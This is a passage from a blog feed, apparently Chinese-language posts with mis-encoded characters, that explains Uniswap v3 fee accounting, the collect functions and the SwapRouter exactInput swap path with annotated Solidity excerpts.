    <url>/2022/09/29/uniswap-v3-4/</url>
    
    <content type="html"><![CDATA[<h1 id="äº¤æ˜“æ‰‹ç»­è´¹"><a href="#äº¤æ˜“æ‰‹ç»­è´¹" class="headerlink" title="äº¤æ˜“æ‰‹ç»­è´¹"></a>äº¤æ˜“æ‰‹ç»­è´¹</h1><h2 id="è®¡ç®—åŸç†"><a href="#è®¡ç®—åŸç†" class="headerlink" title="è®¡ç®—åŸç†"></a>è®¡ç®—åŸç†</h2><p>ä»¥æ™®é€šç”¨æˆ·çš„è§†è§’æ¥çœ‹ï¼Œå¯¹æ¯” Uniswap v2ï¼ŒUniswap v3 åœ¨æ‰‹ç»­è´¹æ–¹é¢åšäº†å¦‚ä¸‹æ”¹åŠ¨ï¼š</p><ul><li>æ·»åŠ æµåŠ¨æ€§æ—¶ï¼Œæ‰‹ç»­è´¹å¯ä»¥æœ‰ 3ä¸ªçº§åˆ«ä¾›é€‰æ‹©ï¼š0.05%, 0.3% å’Œ 1%ï¼Œæœªæ¥å¯ä»¥é€šè¿‡æ²»ç†åŠ å…¥æ›´å¤šå¯é€‰çš„æ‰‹ç»­è´¹ç‡</li><li>Uniswap v2 ä¸­æ‰‹ç»­è´¹ä¼šåœ¨æ”¶å–åè‡ªåŠ¨å¤æŠ•ç§°ä¸º LP çš„ä¸€éƒ¨åˆ†ï¼Œå³æ¯æ¬¡æ‰‹ç»­è´¹éƒ½è‡ªåŠ¨å˜æˆæµåŠ¨æ€§åŠ å…¥æ± å­ä¸­ï¼Œè€Œ Uniswap v3 ä¸­æ”¶å–çš„æ‰‹ç»­è´¹ä¸ä¼šè‡ªåŠ¨å¤æŠ•ï¼ˆä¸»è¦æ˜¯ä¸ºäº†æ–¹ä¾¿åˆçº¦çš„è®¡ç®—ï¼‰ï¼Œéœ€è¦æ‰‹åŠ¨å–å‡ºæ‰‹ç»­è´¹</li><li>ä¸åŒæ‰‹ç»­è´¹çº§åˆ«ï¼Œåœ¨æ·»åŠ æµåŠ¨æ€§æ—¶ï¼Œä»·æ ¼å¯é€‰å€¼çš„æœ€å°ç²’åº¦ä¹Ÿä¸ä¸€æ ·ï¼ˆè¿™ä¸ªæ˜¯å› ä¸º tick spacing çš„å½±å“ï¼‰ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œæ‰‹ç»­è´¹è¶Šä½ï¼Œä»·æ ¼å¯é€‰å€¼è¶Šç²¾ç»†ï¼Œå› æ­¤å®˜æ–¹æ¨èä»·æ ¼æ³¢åŠ¨å°çš„äº¤æ˜“å¯¹ä½¿ç”¨ä½è´¹ç‡ï¼ˆä¾‹å¦‚ç¨³å®šå¸äº¤æ˜“å¯¹ï¼‰</li></ul><p>ä»¥å¼€å‘è€…çš„è§†è§’æ¥çœ‹ï¼ŒUniswap v3 çš„æ‰‹ç»­è´¹è®¡ç®—ç›¸å¯¹ä¼šæ¯”è¾ƒå¤æ‚ï¼Œ å› ä¸ºå®ƒéœ€è¦é’ˆå¯¹æ¯ä¸€ä¸ª <code>position</code> æ¥è¿›è¡Œå•ç‹¬çš„è®¡ç®—ï¼Œä¸ºäº†æ–¹ä¾¿è®¡ç®—ï¼Œåœ¨ä»£ç ä¸­ä¼šå°†æ‰‹ç»­è´¹ç›¸å…³çš„å…ƒæ•°æ®è®°å½•åœ¨ <code>position</code> çš„è¾¹ç•Œ tick ä¸Šï¼ˆè¿™äº› tick ä¸Šè¿˜å­˜å‚¨äº† Î”LÎ”L ç­‰å…ƒæ•°æ®ï¼‰ã€‚</p><p> å½“æˆ‘ä»¬è®¡ç®—äº¤æ˜“çš„æ‰‹ç»­è´¹æ—¶ï¼Œæˆ‘ä»¬éœ€è¦è®¡ç®—å¦‚ä¸‹å€¼ï¼š</p><ul><li>æ¯ä¸€ä¸ª <code>position</code> æ”¶å–çš„æ‰‹ç»­è´¹ï¼ˆtoken0, token1 éœ€è¦åˆ†åˆ«å•ç‹¬è®¡ç®—ï¼‰</li><li>ç”¨æˆ·å¦‚æœæå–äº†æ‰‹ç»­è´¹ï¼Œéœ€è¦è®°å½•ç”¨æˆ·å·²æå–çš„æ•°å€¼</li></ul><p>v3 ä¸­æœ‰ä»¥ä¸‹å‡ ä¸ªå…³äºæ‰‹ç»­è´¹çš„å˜é‡ï¼š</p><ul><li>äº¤æ˜“æ± ä¸­æ‰‹ç»­è´¹çš„è´¹ç‡å€¼ï¼Œè¿™é‡Œè®°å½•çš„å€¼æ—¶ä»¥ 1000000 ä¸ºåŸºæ•°çš„å€¼ï¼Œä¾‹å¦‚å½“æ‰‹ç»­è´¹ä¸º 0.03% æ—¶ï¼Œè´¹ç‡å€¼ä¸º 300</li><li>å…¨å±€çŠ¶æ€å˜é‡ <code>feeGrowthGlobal0X128</code> å’Œ <code>feeGrowthGlobal1X128</code> ï¼Œåˆ†åˆ«è¡¨ç¤º token0 å’Œ token1 æ‰€ç´¯è®¡çš„æ‰‹ç»­è´¹æ€»é¢ï¼Œä½¿ç”¨äº† <code>Q128.128</code> æµ®ç‚¹æ•°æ¥è®°å½•</li><li>å¯¹äºæ¯ä¸ª tickï¼Œè®°å½•äº† <code>feeGrowthOutside0X128</code> å’Œ <code>feeGrowthOutside1X128</code>ï¼Œè¿™ä¸¤ä¸ªå˜é‡è®°å½•äº†å‘ç”Ÿåœ¨æ­¤ tick ã€Œå¤–ä¾§ã€çš„æ‰‹ç»­è´¹æ€»é¢ï¼Œå¤–ä¾§æŒ‡çš„æ˜¯ä¸å½“å‰ä»·æ ¼æ‰€å¯¹åº”çš„ tick ç›¸å¯¹äº tick i çš„ç›¸åä¾§ã€‚</li><li>å¯¹äºæ¯ä¸ª <code>position</code>ï¼Œè®°å½•äº†æ­¤ <code>position</code> å†…çš„æ‰‹ç»­è´¹æ€»é¢ <code>feeGrowthInside0LastX128</code> å’Œ <code>feeGrowthInside1LastX128</code>ï¼Œè¿™ä¸ªå€¼ä¸éœ€è¦æ¯æ¬¡éƒ½æ›´æ–°ï¼Œå®ƒåªä¼šåœ¨ <code>position</code> å‘ç”Ÿå˜åŠ¨ï¼Œæˆ–è€…ç”¨æˆ·æå–æ‰‹ç»­è´¹æ—¶æ›´æ–°</li></ul><p>éœ€è¦æ³¨æ„çš„æ—¶ï¼Œä¸Šé¢è¿™äº›æ‰‹ç»­è´¹çŠ¶æ€å˜é‡éƒ½æ˜¯æ¯ä¸€ä»½ LP æ‰€å¯¹åº”çš„æ‰‹ç»­è´¹ï¼Œåœ¨è®¡ç®—çœŸæ­£çš„æ‰‹ç»­è´¹æ—¶ï¼Œéœ€è¦ä½¿ç”¨ LP æ•°ç›¸ä¹˜æ¥å¾—å‡ºå®é™…æ‰‹ç»­è´¹æ•°é¢ï¼Œåˆå› ä¸º LP æ•°åœ¨ä¸åŒä»·æ ¼å¯èƒ½æ—¶ä¸åŒçš„ï¼ˆå› ä¸ºæµåŠ¨æ€§æ·±åº¦ä¸åŒï¼‰ï¼Œæ‰€ä»¥åœ¨è®¡ç®—æ‰‹ç»­è´¹æ—¶åªèƒ½é’ˆå¯¹ <code>position</code> è¿›è¡Œè®¡ç®—ï¼ˆåŒä¸€ä¸ª <code>position</code> å†… LP æ€»é‡ä¸å˜ï¼‰ã€‚</p><p><img src="/2022/09/29/uniswap-v3-4/image-20220925211502549.png" alt="image-20220925211502549"></p><p><img src="/2022/09/29/uniswap-v3-4/image-20220925211529269.png" alt="image-20220925211529269"></p><p><img src="/2022/09/29/uniswap-v3-4/image-20220925211548605.png" alt="image-20220925211548605"></p><p><img src="/2022/09/29/uniswap-v3-4/image-20220925211622048.png" alt="image-20220925211622048"></p><p><img src="/2022/09/29/uniswap-v3-4/image-20220925211636485.png" alt="image-20220925211636485"></p><h2 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h2><p>æ‰‹ç»­è´¹æ›´æ–°çš„ä»£ç åœ¨å‰é¢æœ‰æåˆ°è¿‡</p><p>è¿™é‡Œçœ‹ä¸€ä¸‹æ‰‹ç»­è´¹çš„æå–</p><p>coreä¸­æ‰‹ç»­è´¹çš„æå–æ˜¯ä»¥ <code>position</code> ä¸ºå•ä½è¿›è¡Œæå–çš„ã€‚ä½¿ç”¨ <code>UniswapV3Pool.collect</code> æå–æ‰‹ç»­è´¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function collect(<br>    address recipient,<br>    int24 tickLower,<br>    int24 tickUpper,<br>    uint128 amount0Requested,<br>    uint128 amount1Requested<br>) external override lock returns (uint128 amount0, uint128 amount1) &#123;<br>    // we don&#x27;t need to checkTicks here, because invalid positions will never have non-zero tokensOwed&#123;0,1&#125;<br>    // è·å– position æ•°æ®<br>    Position.Info storage position = positions.get(msg.sender, tickLower, tickUpper);<br><br>    // æ ¹æ®å‚æ•°è°ƒæ•´éœ€è¦æå–çš„æ‰‹ç»­è´¹<br>    amount0 = amount0Requested &gt; position.tokensOwed0 ? position.tokensOwed0 : amount0Requested;<br>    amount1 = amount1Requested &gt; position.tokensOwed1 ? position.tokensOwed1 : amount1Requested;<br><br>    // å°†æ‰‹ç»­è´¹å‘é€ç»™ç”¨æˆ·<br>    if (amount0 &gt; 0) &#123;<br>        position.tokensOwed0 -= amount0;<br>        TransferHelper.safeTransfer(token0, recipient, amount0);<br>    &#125;<br>    if (amount1 &gt; 0) &#123;<br>        position.tokensOwed1 -= amount1;<br>        TransferHelper.safeTransfer(token1, recipient, amount1);<br>    &#125;<br><br>    emit Collect(msg.sender, recipient, tickLower, tickUpper, amount0, amount1);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œ <code>posiiton</code> ä¸­çš„æ‰‹ç»­è´¹å¯èƒ½å¹¶ä¸æ˜¯æœ€æ–°çš„ï¼ˆæ‰‹ç»­è´¹æ€»æ•°åªä¼šåœ¨ <code>position</code> çš„æµåŠ¨æ€§æ›´æ–°æ—¶æ›´æ–°ï¼‰ã€‚å› æ­¤åœ¨æå–æ‰‹ç»­è´¹å‰ï¼Œéœ€è¦ä¸»åŠ¨è§¦å‘ä¸€æ¬¡æ‰‹ç»­è´¹çš„æ›´æ–°ï¼Œè¿™äº›æ“ä½œå·²ç»åœ¨ <code>uniswap-v3-periphery</code> ä»“åº“ä¸­è¿›è¡Œäº†å°è£…ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function collect(CollectParams calldata params)<br>    external<br>    payable<br>    override<br>    isAuthorizedForToken(params.tokenId)<br>    returns (uint256 amount0, uint256 amount1)<br>&#123;<br>    require(params.amount0Max &gt; 0 || params.amount1Max &gt; 0);<br>    // allow collecting to the nft position manager address with address 0<br>    address recipient = params.recipient == address(0) ? address(this) : params.recipient;<br><br>    // æŸ¥è¯¢ position ä¿¡æ¯<br>    Position storage position = _positions[params.tokenId];<br><br>    PoolAddress.PoolKey memory poolKey = _poolIdToPoolKey[position.poolId];<br><br>    IUniswapV3Pool pool = IUniswapV3Pool(PoolAddress.computeAddress(factory, poolKey));<br><br>    (uint128 tokensOwed0, uint128 tokensOwed1) = (position.tokensOwed0, position.tokensOwed1);<br><br>    // trigger an update of the position fees owed and fee growth snapshots if it has any liquidity<br>    // è¿™é‡Œå†æ¬¡æ›´æ–°ä¸€æ¬¡æ‰‹ç»­è´¹ç´¯ç§¯æ€»é¢<br>    if (position.liquidity &gt; 0) &#123;<br>        // ä½¿ç”¨ pool.burn() æ¥è§¦å‘æ‰‹ç»­è´¹çš„æ›´æ–°<br>        pool.burn(position.tickLower, position.tickUpper, 0);<br>        (, uint256 feeGrowthInside0LastX128, uint256 feeGrowthInside1LastX128, , ) =<br>            pool.positions(PositionKey.compute(address(this), position.tickLower, position.tickUpper));<br><br>        tokensOwed0 += uint128(<br>            FullMath.mulDiv(<br>                feeGrowthInside0LastX128 - position.feeGrowthInside0LastX128,<br>                position.liquidity,<br>                FixedPoint128.Q128<br>            )<br>        );<br>        tokensOwed1 += uint128(<br>            FullMath.mulDiv(<br>                feeGrowthInside1LastX128 - position.feeGrowthInside1LastX128,<br>                position.liquidity,<br>                FixedPoint128.Q128<br>            )<br>        );<br><br>        position.feeGrowthInside0LastX128 = feeGrowthInside0LastX128;<br>        position.feeGrowthInside1LastX128 = feeGrowthInside1LastX128;<br>    &#125;<br><br>    // compute the arguments to give to the pool#collect method<br>    // æå–æ‰‹ç»­è´¹çš„æœ€å¤§å€¼ï¼Œä¸èƒ½è¶…è¿‡æ‰‹ç»­è´¹æ€»é¢<br>    (uint128 amount0Collect, uint128 amount1Collect) =<br>        (<br>            params.amount0Max &gt; tokensOwed0 ? tokensOwed0 : params.amount0Max,<br>            params.amount1Max &gt; tokensOwed1 ? tokensOwed1 : params.amount1Max<br>        );<br><br>    // the actual amounts collected are returned<br>    // è°ƒç”¨ pool.collect å°†æ‰‹ç»­è´¹å‘é€ç»™ recipient<br>    (amount0, amount1) = pool.collect(<br>        recipient,<br>        position.tickLower,<br>        position.tickUpper,<br>        amount0Collect,<br>        amount1Collect<br>    );<br><br>    // sometimes there will be a few less wei than expected due to rounding down in core, but we just subtract the full amount expected<br>    // instead of the actual amount so we can burn the token<br>    (position.tokensOwed0, position.tokensOwed1) = (tokensOwed0 - amount0Collect, tokensOwed1 - amount1Collect);<br><br>    emit Collect(params.tokenId, recipient, amount0Collect, amount1Collect);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°å°±æ˜¯å…ˆç”¨ <code>pool.burn</code> å‡½æ•°æ¥è§¦å‘ pool ä¸­ <code>position</code> å†…æ‰‹ç»­è´¹æ€»é¢çš„æ›´æ–°ï¼Œä½¿å…¶æ›´æ–°ä¸ºå½“å‰çš„æœ€æ–°å€¼ã€‚è°ƒç”¨æ—¶ä¼ å…¥å‚æ•°çš„ Liquidity ä¸º 0ï¼Œè¡¨ç¤ºåªæ˜¯ç”¨æ¥è§¦å‘æ‰‹ç»­è´¹æ€»é¢çš„æ›´æ–°ï¼Œå¹¶æ²¡æœ‰è¿›è¡ŒæµåŠ¨æ€§çš„æ›´æ–°ã€‚æ›´æ–°å®Œæˆåï¼Œå†è°ƒç”¨ <code>pool.collect</code> æå–æ‰‹ç»­è´¹ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Etherum</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Uniswap Part â…¢ | äº¤æ˜“è¿‡ç¨‹</title>
    <link href="/2022/09/29/uniswap-v3-3/"/>
    <url>/2022/09/29/uniswap-v3-3/</url>
    
    <content type="html"><![CDATA[<h1 id="äº¤æ˜“è¿‡ç¨‹"><a href="#äº¤æ˜“è¿‡ç¨‹" class="headerlink" title="äº¤æ˜“è¿‡ç¨‹"></a>äº¤æ˜“è¿‡ç¨‹</h1><p> <code>SwapRouter</code> åˆçº¦ä¸­å°è£…äº†é¢å‘ç”¨æˆ·çš„äº¤æ˜“æ¥å£ï¼š</p><ul><li><code>exactInput</code>ï¼šæŒ‡å®šäº¤æ˜“å¯¹è·¯å¾„ï¼Œä»˜å‡ºçš„ x token æ•°å’Œé¢„æœŸå¾—åˆ°çš„æœ€å° y token æ•°ï¼ˆx, y å¯ä»¥äº’æ¢ï¼‰</li><li><code>exactOutput</code>ï¼šæŒ‡å®šäº¤æ˜“è·¯å¾„ï¼Œä»˜å‡ºçš„ x token æœ€å¤§æ•°å’Œé¢„æœŸå¾—åˆ°çš„ y token æ•°ï¼ˆx, y å¯ä»¥äº’æ¢ï¼‰</li></ul><p>å…³äº <code>exactInput</code> è¿™ä¸ªæ¥å£ï¼Œè°ƒç”¨æµç¨‹å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sequence">User-&gt;SwapRouter:exactInput<br>SwapRouter-&gt;SwapRouter:exactInputInternal<br>SwapRouter-&gt;UniswapV3Pool:swap<br>UniswapV3Pool-&gt;UniswapV3Pool:computeSwapStep<br></code></pre></td></tr></table></figure><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p><img src="/2022/09/29/uniswap-v3-3/image-20220819175714261.png" alt="image-20220819175714261"></p><p>åœ¨V2ä¸­ï¼ŒæµåŠ¨æ€§æ˜¯å‡åŒ€åˆ†å¸ƒçš„ï¼Œè€ŒV3ä¸­å› ä¸ºä¸€ä¸ªäº¤æ˜“æ± ä¸­ä¼šæœ‰å¤šä¸ªä¸åŒæ·±åº¦çš„æµåŠ¨æ± ï¼ˆæ¯ä¸€ä¸ªå¯ä»¥å•ç‹¬è®¾ç½®äº¤æ˜“ä»·æ ¼åŒºé—´ï¼‰ï¼Œå› æ­¤ä¸€æ¬¡äº¤æ˜“çš„è¿‡ç¨‹å¯èƒ½è·¨è¶Šå¤šä¸ªä¸åŒçš„æ·±åº¦</p><p><img src="/2022/09/29/uniswap-v3-3/image-20220819175735791.png" alt="image-20220819175735791"></p><p>ä»¥ä¸Šæ˜¯çœŸå®æƒ…å†µä¸­çš„æµåŠ¨æ€§åˆ†å¸ƒ</p><p>ç°åœ¨å‡è®¾ä»·æ ¼å¤„äºä¸€ä¸ªæŒç»­ä¸Šæ¶¨çš„è¶‹åŠ¿ï¼Œå½“ä»·æ ¼å¼€å§‹ä»å·¦è‡³å³ç©¿è¿‡è¿™äº›ä»·æ ¼åŒºé—´æ—¶ï¼Œä¼šä¸æ–­ç”¨ä¸€ç§èµ„äº§æ¢å–å¦ä¸€ç§èµ„äº§ï¼Œè€Œè¢«æ¢å‡ºçš„èµ„äº§å‚¨å¤‡æ˜¯ä¸æ–­å‡å°çš„ï¼Œä¸€æ—¦å½“å‰ä»·æ ¼åŒºé—´çš„æŸç§èµ„äº§è¢«è€—å°½ï¼Œä»·æ ¼ä¼šç©¿è¿‡å½“å‰åŒºé—´ï¼Œè¿›å…¥ä¸‹ä¸€ä¸ªåŒºé—´ï¼Œç”±æ­¤äº§ç”Ÿäº†ä»·æ ¼çš„å˜åŒ–ï¼ˆå› ä¸ºä»·æ ¼å³ç§»äº†ï¼Œå˜å¤§äº†ï¼‰ã€‚åœ¨ä»·æ ¼ç§»åŠ¨æ¶ˆè€—æ± å†…èµ„äº§æ•°é‡çš„è¿‡ç¨‹ä¸­ï¼Œè¾“å…¥çš„èµ„äº§æ•°é‡ä¹Ÿä¼šä¸æ–­å‡å°‘ï¼Œä¸€æ—¦åœ¨æŸä¸ªåŒºé—´è¾“å…¥èµ„äº§è¢«è€—å°½ï¼Œé‚£ä¹ˆä»·æ ¼å°±ä¼šåœç•™åœ¨è¯¥åŒºé—´å†…ã€‚</p><p>å½“ç„¶åªæ˜¯è®©ä»·æ ¼åœç•™åœ¨åŒºé—´å†…ï¼Œæ˜¯ä¸ç²¾ç¡®çš„ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±éœ€è¦å€ŸåŠ©è®¡ç®—æ·»åŠ æµåŠ¨æ€§æ¨å¯¼å‡ºæ¥çš„å…¬å¼ï¼Œå»åæ¨è®¡ç®—å‡ºä¸€ä¸ªç²¾ç¡®çš„ä»·æ ¼ï¼ˆåœ¨è¯¥ä»·æ ¼åŒºé—´å†…ï¼‰ã€‚</p><h2 id="exactInput"><a href="#exactInput" class="headerlink" title="exactInput"></a>exactInput</h2><p>exactInputå‡½æ•°åœ¨åˆçº¦SwapRouterä¸­ï¼Œå…¶ä¸­struct ExactInputParamså†™åœ¨æ¥å£ISwapRouterä¸­</p><p>è¿™é‡Œä½¿ç”¨ä¸€ä¸ªå¾ªç¯éå†ä¼ å…¥çš„è·¯å¾„ï¼Œè·¯å¾„ä¸­åŒ…å«äº†äº¤æ˜“è¿‡ç¨‹ä¸­æ‰€æœ‰çš„ tokenï¼Œæ¯ç›¸é‚»çš„ä¸¤ä¸ª token ç»„æˆäº†ä¸€ä¸ªäº¤æ˜“å¯¹ã€‚ä¾‹å¦‚å½“éœ€è¦é€šè¿‡ <code>ETH</code> -&gt; <code>USDC</code> -&gt; <code>DAI</code> è·¯å¾„è¿›è¡Œäº¤æ˜“æ—¶ï¼Œä¼šç»è¿‡ä¸¤ä¸ªæ± ï¼š<code>ETH/USDC</code> å’Œ <code>USDC/DAI</code>ï¼Œæœ€ç»ˆå¾—åˆ° <code>DAI</code> ä»£å¸ã€‚å¦‚å‰æ‰€è¿°ï¼Œè¿™é‡Œå…¶å®è¿˜åŒ…å«äº†æ¯ä¸ªäº¤æ˜“å¯¹æ‰€é€‰æ‹©çš„è´¹ç‡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs solidity">struct ExactInputParams &#123;<br>    bytes path; //è·¯å¾„<br>    address recipient; //æ”¶æ¬¾åœ°å€<br>    uint256 deadline; //äº¤æ˜“æœ‰æ•ˆæœŸ<br>    uint256 amountIn; //è¾“å…¥çš„ token æ•°ï¼ˆè¾“å…¥çš„ token åœ°å€å°±æ˜¯ path ä¸­çš„ç¬¬ä¸€ä¸ªåœ°å€ï¼‰<br>    uint256 amountOutMinimum; //é¢„æœŸäº¤æ˜“æœ€å°‘è·å¾—çš„ token æ•°ï¼ˆè·å¾—çš„ token åœ°å€å°±æ˜¯ path ä¸­æœ€åä¸€ä¸ªåœ°å€ï¼‰<br>&#125;<br><br>function exactInput(ExactInputParams memory params)<br>    external<br>    payable<br>    override<br>    checkDeadline(params.deadline)<br>    returns (uint256 amountOut)<br>&#123;<br>    address payer = msg.sender; // msg.sender pays for the first hop<br><br>    //éå†ä¼ å…¥çš„è·¯å¾„ï¼Œè¿›è¡Œäº¤æ˜“<br>    while (true) &#123;<br>        bool hasMultiplePools = params.path.hasMultiplePools();<br><br>        // the outputs of prior swaps become the inputs to subsequent ones<br>        //å®Œæˆå½“å‰è·¯å¾„çš„äº¤æ˜“<br>        params.amountIn = exactInputInternal(<br>            params.amountIn,<br>            //å¦‚æœæ˜¯ä¸­é—´äº¤æ˜“ï¼Œæœ¬åˆçº¦ä»£ä¸ºæ”¶å–å’Œæ”¯ä»˜ä¸­é—´ä»£å¸<br>            //è¿™é‡Œä¼šåˆ¤æ–­æ˜¯å¦æ˜¯æœ€åä¸€æ¬¡äº¤æ˜“ï¼Œå½“æ˜¯æœ€åä¸€æ¬¡äº¤æ˜“æ—¶ï¼Œè·å–çš„ token çš„åœ°å€æ‰æ˜¯ç”¨æˆ·çš„æŒ‡å®šçš„åœ°å€<br>            hasMultiplePools ? address(this) : params.recipient, // for intermediate swaps, this contract custodies<br>            0,<br>            //å›è°ƒå‡½æ•°<br>            SwapCallbackData(&#123;<br>                path: params.path.getFirstPool(), // only the first pool in the path is necessary<br>                payer: payer<br>            &#125;)<br>        );<br><br>        // decide whether to continue or terminate<br>        //å¦‚æœè·¯å¾„å…¨éƒ¨éå†å®Œæˆï¼Œåˆ™é€€å‡ºå¾ªç¯ï¼Œäº¤æ˜“å®Œæˆ<br>        if (hasMultiplePools) &#123;<br>            payer = address(this); // at this point, the caller has paid<br>            params.path = params.path.skipToken();<br>        &#125; else &#123;<br>            amountOut = params.amountIn;<br>            break;<br>        &#125;<br>    &#125;<br><br>    //æ£€æŸ¥äº¤æ˜“æ˜¯å¦æ»¡è¶³é¢„æœŸ<br>    //å¦‚æœäº¤æ˜“çš„è·å¾— token æ•°æ»¡è¶³çº¦æŸï¼Œåˆ™æœ¬æ¬¡äº¤æ˜“ç»“æŸã€‚<br>    require(amountOut &gt;= params.amountOutMinimum, &#x27;Too little received&#x27;);<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="è·¯å¾„"><a href="#è·¯å¾„" class="headerlink" title="è·¯å¾„"></a>è·¯å¾„</h3><p>ä¸Šé¢è¾“å…¥çš„å‚æ•°ä¸­ <code>path</code> å­—æ®µæ˜¯ <code>bytes</code> ç±»å‹ï¼Œé€šè¿‡è¿™ç§ç±»å‹å¯ä»¥å®ç°æ›´ç´§å‡‘çš„ç¼–ç ã€‚Uniswap ä¼šå°† <code>bytes</code> ä½œä¸ºä¸€ä¸ªæ•°ç»„ä½¿ç”¨ï¼Œ<code>bytes</code> ç±»å‹å°±æ˜¯ä¸€è¿ä¸²çš„ <code>byte1</code>ï¼Œä½†æ˜¯ä¸ä¼šå¯¹æ¯ä¸€ä¸ªæˆå‘˜ä½¿ç”¨ä¸€ä¸ª wordï¼Œå› æ­¤ç›¸æ¯”æ™®é€šæ•°ç»„å…¶ç»“æ„æ›´åŠ ç´§å‡‘ã€‚åœ¨ Uniswap V3 ä¸­ï¼Œ path å†…éƒ¨ç¼–ç ç»“æ„å¦‚ä¸‹å›¾ï¼š</p><img src="/2022/09/29/uniswap-v3-3/image-20220819175811545.png" alt="image-20220819175811545" style="zoom:80%;"><p>å›¾ä¸­å±•ç¤ºäº†ä¸€ä¸ªåŒ…å« 2ä¸ªè·¯å¾„ï¼ˆpool0, å’Œ pool1ï¼‰çš„ path ç¼–ç ã€‚Uniswap å°†ç¼–ç è§£ç æ“ä½œå°è£…åœ¨äº† <code>Path</code> åº“ä¸­ï¼Œæœ¬æ–‡ä¸å†èµ˜è¿°å…¶è¿‡ç¨‹ã€‚æ¯æ¬¡äº¤æ˜“æ—¶ï¼Œä¼šå–å‡ºå¤´éƒ¨çš„ <code>tokenIn</code>, <code>tokenOut</code>, <code>fee</code>ï¼Œä½¿ç”¨è¿™ä¸‰ä¸ªå‚æ•°æ‰¾åˆ°å¯¹åº”çš„äº¤æ˜“æ± ï¼Œå®Œæˆäº¤æ˜“ã€‚</p><h2 id="exactInputInternal"><a href="#exactInputInternal" class="headerlink" title="exactInputInternal"></a>exactInputInternal</h2><p>å•ä¸ªæ± çš„äº¤æ˜“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 